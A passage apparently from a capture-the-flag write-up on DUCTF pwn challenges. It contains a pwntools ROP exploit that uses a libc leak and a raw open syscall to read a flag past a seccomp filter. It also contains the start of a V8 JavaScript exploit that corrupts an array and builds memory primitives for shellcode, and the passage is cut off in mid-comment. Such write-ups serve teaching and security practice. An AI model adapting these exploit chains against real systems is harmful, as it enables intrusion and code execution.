class="hljs-string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path&#125; )<br>	<br>	<span class="hljs-keyword">else</span>:<br>		elf = ELF(elf_path)<br>		io = remote(server_ip, server_port)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br><br>	exploit()<br>	finish()<br><br></code></pre></td></tr></table></figure>





<h2 id="4-return-to-whats-revenge"><a href="#4-return-to-whats-revenge" class="headerlink" title="4 [return-to-whats-revenge]"></a>4 [return-to-whats-revenge]</h2><p>Same as before, there is a stack overflow  vulnerability in this program. but this program has a protection in sandbox function.  It is a seccomp rule to forbid some syscall. The sandbox function content as follows:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">filter[24].code = 6;<br>filter[24].jt = 0;<br>filter[24].jf = 0;<br>filter[0x18].k = 0;<br>bpf_resolve_jumps(&amp;lab, filter, 0x19uLL);<br>prog.len = 0x19;<br>prog.filter = filter;<br>prctl(0x26, 1LL, 0LL, 0LL, 0LL, *(_QWORD *)&amp;prog.len, filter);// PR_SET_NO_NEW_PRIVS, no execve<br>prctl(0x16, 2LL, &amp;prog);<br></code></pre></td></tr></table></figure>

<p>but this program I can’t use seccomp tool to dump the rule. so it has a bad syscall  when I use orw method to exploit this program, this rule cannot use open function to open file, must use syscall with specific value in regisger to realize open function, or it will call open syscall failed! That’s a place easily to make a mistake. </p>
<p>​	you must create a open function syscall by yourself, or while calling open function in libc will be a bad syscall.</p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># author: i0gan</span><br><span class="hljs-comment"># env: pwndocker [skysider/pwndocker (v: 2020/09/09)]</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br><br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>elf_path  = <span class="hljs-string">&#x27;./return-to-whats-revenge.bk&#x27;</span><br><br>MODIFY_LD = <span class="hljs-number">0</span><br>arch = <span class="hljs-string">&#x27;64&#x27;</span><br>libc_v = <span class="hljs-string">&#x27;2.23&#x27;</span><br><br>ld_path   = <span class="hljs-string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="hljs-string">&#x27;/&#x27;</span> + arch + <span class="hljs-string">&#x27;/lib/ld-linux-x86-64.so.2&#x27;</span><br>libs_path = <span class="hljs-string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="hljs-string">&#x27;/&#x27;</span> + arch + <span class="hljs-string">&#x27;/lib&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="hljs-string">&#x27;/&#x27;</span> + arch + <span class="hljs-string">&#x27;/lib/libc.so.6&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;./libc.so.6&#x27;</span><br><span class="hljs-comment">#libc_path = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br><br><span class="hljs-comment"># change ld path </span><br><span class="hljs-keyword">if</span>(MODIFY_LD):<br>	os.system(<span class="hljs-string">&#x27;cp &#x27;</span> + elf_path + <span class="hljs-string">&#x27; &#x27;</span> + elf_path + <span class="hljs-string">&#x27;.bk&#x27;</span>)<br>	change_ld_cmd = <span class="hljs-string">&#x27;patchelf  --set-interpreter &#x27;</span> + ld_path +<span class="hljs-string">&#x27; &#x27;</span> + elf_path<br>	os.system(change_ld_cmd)<br>	li(<span class="hljs-string">&#x27;modify ld ok!&#x27;</span>)<br>	exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># remote server ip and port</span><br>server_ip = <span class="hljs-string">&quot;chal.duc.tf&quot;</span><br>server_port = <span class="hljs-number">30006</span><br><br><span class="hljs-comment"># if local debug</span><br>LOCAL = <span class="hljs-number">1</span><br>LIBC  = <span class="hljs-number">1</span><br><br><br><span class="hljs-comment">#--------------------------func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>	<span class="hljs-keyword">if</span>(LOCAL):<br>		gdb.attach(io)<br><br><br><span class="hljs-comment">#--------------------------exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>	li(<span class="hljs-string">&#x27;exploit...&#x27;</span>)<br>	pop_rdi = <span class="hljs-number">0x04019db</span><br>	ret = <span class="hljs-number">0x0401016</span><br>	bss = <span class="hljs-number">0x404000</span> + <span class="hljs-number">0x100</span><br>	p = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x30</span><br>	p += p64(<span class="hljs-number">0</span>)<br>	p += p64(pop_rdi)<br>	p += p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>	p += p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>	p += p64(<span class="hljs-number">0x4011DA</span>)<br><br>	sla(<span class="hljs-string">&#x27;?&#x27;</span>, p)<br>	leak = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">5</span>:] + <span class="hljs-string">b&#x27;\x7f\x00\x00&#x27;</span>)<br>	li(<span class="hljs-string">&#x27;leak: &#x27;</span> + <span class="hljs-built_in">hex</span>(leak))<br>	libc_base = leak - <span class="hljs-number">0x0809c0</span><br>	li(<span class="hljs-string">&#x27;lib_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>	pop_rdx = libc_base + <span class="hljs-number">0x1b96</span><br>	pop_rsi = libc_base + <span class="hljs-number">0x23e6a</span><br>	pop_rax = libc_base + <span class="hljs-number">0x439c8</span><br>	libc_read = libc_base + <span class="hljs-number">0x110070</span><br>	libc_open = libc_base + <span class="hljs-number">0x10fc40</span><br>	syscall = libc_base + <span class="hljs-number">0x11007f</span><br><br>	p = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x30</span><br>	p += p64(<span class="hljs-number">0</span>)<br>	<span class="hljs-comment"># read</span><br>	p += p64(pop_rdi) + p64(<span class="hljs-number">0x0</span>)<br>	p += p64(pop_rsi) + p64(bss)<br>	p += p64(pop_rdx) + p64(<span class="hljs-number">0x100</span>)<br>	p += p64(libc_read)<br><br>	<span class="hljs-comment"># open</span><br>	p += p64(pop_rdi) + p64(bss)<br>	p += p64(pop_rsi) + p64(<span class="hljs-number">0</span>)<br>	p += p64(pop_rdx) + p64(<span class="hljs-number">0</span>)<br>	p += p64(pop_rax) + p64(<span class="hljs-number">2</span>)<br>	p += p64(syscall)<br>	<br>	<span class="hljs-comment"># read</span><br>	p += p64(pop_rdi) + p64(<span class="hljs-number">0x3</span>)<br>	p += p64(pop_rsi) + p64(bss)<br>	p += p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>)<br>	p += p64(libc_read)<br><br>	<span class="hljs-comment"># puts</span><br>	p += p64(pop_rdi)<br>	p += p64(bss)<br>	p += p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br><br>	<span class="hljs-comment">#db()</span><br><br>	sla(<span class="hljs-string">&#x27;?&#x27;</span>, p)<br><br>	<span class="hljs-comment">#p = b&#x27;/chal/flag.txt\x00&#x27;</span><br>	p = <span class="hljs-string">b&#x27;flag.txt\x00&#x27;</span><br>	sl(p);<br>	<br>	<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>	ia()<br>	c()<br><br><span class="hljs-comment">#--------------------------main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	<br>	<span class="hljs-keyword">if</span> LOCAL:<br>		elf = ELF(elf_path)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br>			io = elf.process(env = &#123;<span class="hljs-string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path, <span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )<br>		<span class="hljs-keyword">else</span>:<br>			io = elf.process(env = &#123;<span class="hljs-string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path&#125; )<br>	<br>	<span class="hljs-keyword">else</span>:<br>		elf = ELF(elf_path)<br>		io = remote(server_ip, server_port)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br><br>	exploit()<br>	finish()<br><br></code></pre></td></tr></table></figure>



<h2 id="5-is-this-pwn-or-web"><a href="#5-is-this-pwn-or-web" class="headerlink" title="5 [is-this-pwn-or-web]"></a>5 [is-this-pwn-or-web]</h2><p>This puzzle is not a python sandbox escape, it is a javascript memory overflow.</p>
<h3 id="js-exp"><a href="#js-exp" class="headerlink" title="js exp"></a>js exp</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">/* This challenge is meant to be extremely hard. The way this exploit goes is</span><br><span class="hljs-comment"> * essentially as follows:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Step 1: Read the patch.diff file to figure out the vulnerability</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Step 2: Use the vulnerability to get a corrupted float array. You can use</span><br><span class="hljs-comment"> *         this array to overwrite its own length to a very large number</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Step 3: Once you&#x27;ve done this, exploitation becomes (relatively) easy. There</span><br><span class="hljs-comment"> *         are loads of blog posts and other V8 exploits that you can use as</span><br><span class="hljs-comment"> *         a starting point. I&#x27;ll list some below. The only issue will be that</span><br><span class="hljs-comment"> *         V8 somewhat recently started shipping with pointer compression, and</span><br><span class="hljs-comment"> *         most blog posts / exploits will be made for challenges / vulns from</span><br><span class="hljs-comment"> *         V8 versions without pointer compression.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/</span><br><span class="hljs-comment"> * https://blog.exodusintel.com/2019/09/09/patch-gapping-chrome/</span><br><span class="hljs-comment"> * https://tcode2k16.github.io/blog/posts/2020-03-15-confidence-ctf/#chromatic-aberration</span><br><span class="hljs-comment"> * https://blog.hexrabbit.io/2020/03/16/chromatic-aberration-writeup/ (use google translate)</span><br><span class="hljs-comment"> * https://halbecaf.com/2017/05/24/exploiting-a-v8-oob-write/ (very old)</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If you still have questions regarding this challenge, feel free to DM me </span><br><span class="hljs-comment"> * anywhere. I&#x27;ll do my best to respond to queries!</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Discord: Faith#2563</span><br><span class="hljs-comment"> * Twitter: @farazsth98</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">// Helper functions setup to convert between doubles and numbers when needed</span><br><span class="hljs-keyword">var</span> buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">8</span>);<br><span class="hljs-keyword">var</span> f64_buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(buf);<br><span class="hljs-keyword">var</span> u32_buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint32Array</span>(buf);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ftoi</span>(<span class="hljs-params">val</span>) &#123; <span class="hljs-comment">// typeof(val) == float</span><br>    f64_buf[<span class="hljs-number">0</span>] = val;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">BigInt</span>(u32_buf[<span class="hljs-number">0</span>]) + (<span class="hljs-title class_">BigInt</span>(u32_buf[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">32n</span>); <span class="hljs-comment">// Watch for little endianness</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">itof</span>(<span class="hljs-params">val</span>) &#123; <span class="hljs-comment">// typeof(val) == BigInt</span><br>    u32_buf[<span class="hljs-number">0</span>] = <span class="hljs-title class_">Number</span>(val &amp; <span class="hljs-number">0xffffffffn</span>);<br>    u32_buf[<span class="hljs-number">1</span>] = <span class="hljs-title class_">Number</span>(val &gt;&gt; <span class="hljs-number">32n</span>);<br>    <span class="hljs-keyword">return</span> f64_buf[<span class="hljs-number">0</span>];<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hex</span>(<span class="hljs-params">val</span>) &#123; <span class="hljs-comment">// typeof(val) == BigInt</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;0x&quot;</span> + val.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>);<br>&#125;<br><br><span class="hljs-comment">// We set up a web assembly page. This is mapped as an RWX page that we will</span><br><span class="hljs-comment">// later write shellcode into.</span><br><span class="hljs-keyword">var</span> wasm_code = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>([<span class="hljs-number">0</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">109</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">133</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">96</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">127</span>,<span class="hljs-number">3</span>,<span class="hljs-number">130</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">112</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">131</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">129</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">145</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">109</span>,<span class="hljs-number">101</span>,<span class="hljs-number">109</span>,<span class="hljs-number">111</span>,<span class="hljs-number">114</span>,<span class="hljs-number">121</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">109</span>,<span class="hljs-number">97</span>,<span class="hljs-number">105</span>,<span class="hljs-number">110</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">10</span>,<span class="hljs-number">138</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">65</span>,<span class="hljs-number">42</span>,<span class="hljs-number">11</span>]);<br><span class="hljs-keyword">var</span> wasm_mod = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Module</span>(wasm_code);<br><span class="hljs-keyword">var</span> wasm_instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Instance</span>(wasm_mod);<br><span class="hljs-keyword">var</span> f = wasm_instance.<span class="hljs-property">exports</span>.<span class="hljs-property">main</span>;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] WebAssembly RWX page setup!&quot;</span>);<br><br><span class="hljs-comment">// Next, set up three arrays. These will be allocated one after another because</span><br><span class="hljs-comment">// of the deterministic nature of the V8 heap. We corrupt the float array.</span><br><span class="hljs-comment">// You can find their offsets relative to each other using GDB.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// While we do this, we also trigger the vulnerability to get a corrupted</span><br><span class="hljs-comment">// float array in `float_arr`</span><br><span class="hljs-keyword">var</span> float_arr = [<span class="hljs-number">1.1</span>];<br>float_arr = float_arr.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// Trigger the vuln</span><br><span class="hljs-keyword">var</span> addrof_arr = [&#123;&#125;, &#123;&#125;]; <span class="hljs-comment">// Used for the addrof primitive later</span><br><span class="hljs-keyword">var</span> arb_read_arr = [<span class="hljs-number">1.1</span>]; <span class="hljs-comment">// Used for the arbitrary read primitive later</span><br><br><span class="hljs-comment">// We set up an ArrayBuffer and a DataView. We will use these later to write </span><br><span class="hljs-comment">// our shellcode into the RWX page.</span><br><span class="hljs-keyword">var</span> buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-keyword">var</span> dataview = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(buf);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] Corrupting float_arr&#x27;s length to 2048&quot;</span>);<br><br><span class="hljs-comment">// We need to store the current `elements` ptr before we corrupt the length</span><br><span class="hljs-comment">// because corrupting the length also requires us to corrupt the `elements` ptr</span><br><span class="hljs-comment">// in the process</span><br><span class="hljs-keyword">var</span> float_arr_elem = <span class="hljs-title function_">ftoi</span>(float_arr[<span class="hljs-number">2</span>]) &amp; <span class="hljs-number">0xffffffffn</span>;<br><br><span class="hljs-comment">// Corrupt the length and keep the `elements` ptr intact</span><br>float_arr[<span class="hljs-number">2</span>] = <span class="hljs-title function_">itof</span>((<span class="hljs-number">0x1000n</span> &lt;&lt; <span class="hljs-number">32n</span>) + float_arr_elem);<br><br><span class="hljs-keyword">if</span> (float_arr.<span class="hljs-property">length</span> === <span class="hljs-number">2048</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] Corruption successful!&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[!] Corruption failed. Try again.&quot;</span>);<br>  <span class="hljs-keyword">throw</span> error;<br>&#125;<br><br><span class="hljs-comment">// Setup addrof primitive</span><br><span class="hljs-comment">// Bottom 32 bits of float_arr[4] corresponds to addrof_arr[0]</span><br><span class="hljs-comment">// We simply set addrof_arr[0] to the object whose address we want to leak</span><br><span class="hljs-comment">// Then we read from float_arr[4]</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">addrof</span>(<span class="hljs-params">obj</span>) &#123;<br>    addrof_arr[<span class="hljs-number">0</span>] = obj;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">ftoi</span>(float_arr[<span class="hljs-number">4</span>]) &amp; <span class="hljs-number">0xffffffffn</span>;<br>&#125;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] Addrof primitive has been setup&quot;</span>);<br><br><span class="hljs-comment">// Setup an arbitrary read primitive for the V8 compressed heap</span><br><span class="hljs-comment">// We do this by overwriting the elements pointer of our arb_read_arr to a</span><br><span class="hljs-comment">// chosen address - 8 (making sure to keep the length set to 0x1000). We</span><br><span class="hljs-comment">// subtract 8 because for any float array, arr[0] == (*elements_ptr + 8).</span><br><span class="hljs-comment">// The elements pointer of arb_read_arr is at float_arr[17], offset found</span><br><span class="hljs-comment">// through GDB.</span><br><span class="hljs-comment">// addr must be a 32-bit value here</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">compressed_arb_read</span>(<span class="hljs-params">addr</span>) &#123;<br>    float_arr[<span class="hljs-number">17</span>] = <span class="hljs-title function_">itof</span>((<span class="hljs-number">0x1000n</span> &lt;&lt; <span class="hljs-number">32n</span>) + addr - <span class="hljs-number">8n</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">ftoi</span>(arb_read_arr[<span class="hljs-number">0</span>]);<br>&#125;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] Arbitrary read primitive for the compressed heap has been setup&quot;</span>);<br><br><span class="hljs-comment">// Setup a function that writes our shellcode to a given address</span><br><span class="hljs-comment">// We do this by overwriting the backing store address of the ArrayBuffer we</span><br><span class="hljs-comment">// previously allocated to our chosen address. We then use the DataView that we</span><br><span class="hljs-comment">// also allocated to write our shellcode to that address space.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Using GDB, we find that the backing store address of our ArrayBuffer is</span><br><span class="hljs-comment">// misaligned at float_arr[20] and float_arr[21]. The misalignment is as</span><br><span class="hljs-comment">// follows:</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// * The upper 32-bits of float_arr[20] correspond to the lower 32 bits of</span><br><span class="hljs-comment">//   the backing store address</span><br><span class="hljs-comment">// * The lower 32-bits of float_arr[21] correspond to the upper 32 bits of</span><br><span class="hljs-comment">//   the backing store address</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// If this is confusing to you, that&#x27;s because it is very confusing :p I would</span><br><span class="hljs-comment">// suggest looking at this in GDB and comparing 